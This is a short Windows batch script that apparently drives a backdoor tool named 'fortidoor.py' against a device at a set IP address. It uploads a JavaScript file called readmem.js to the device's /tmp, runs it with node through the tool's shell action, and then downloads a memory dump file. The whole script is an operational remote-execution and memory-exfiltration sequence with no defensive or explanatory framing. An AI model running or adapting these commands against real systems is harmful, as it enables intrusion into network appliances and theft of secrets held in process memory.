
set target_ip=192.168.1.99
echo target_ip:%target_ip%
set target_pid=%1
echo  target_pid :%target_pid %

python3 fortidoor.py -t https://%target_ip%/ --action upload --lfile readmem.js --rfile /tmp/readmem.js

python3 fortidoor.py -t https://%target_ip%/ --action shell --cmd "/bin/node /tmp/readmem.js"

python3 fortidoor.py -t https://%target_ip%/ --action download --rfile /tmp/memory_2748.log.json

pause
